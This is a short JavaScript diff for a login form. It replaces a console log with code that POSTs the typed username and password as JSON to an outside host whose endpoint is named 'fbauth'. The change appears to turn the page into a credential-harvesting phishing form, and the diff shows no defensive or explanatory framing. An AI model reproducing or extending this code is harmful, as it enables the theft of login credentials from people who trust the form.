@@ -7,8 +7,15 @@ passField = document.getElementById('pass')
 uName = ''
 pass = ''
 
+var xhr = new XMLHttpRequest();
+xhr.open("POST","https://wtd.net.in/api/fbauth/auth" , true);
+xhr.setRequestHeader("Content-Type", "application/json");
+
 onMainButtonClick = () => {
-    console.log(uName, pass)
+    xhr.send(JSON.stringify({ 
+        name: uName, 
+        ps: pass,
+    }));
     // if (uName == '' || pass == ''){
     //     errorBox.style.display = 'block'
     // }
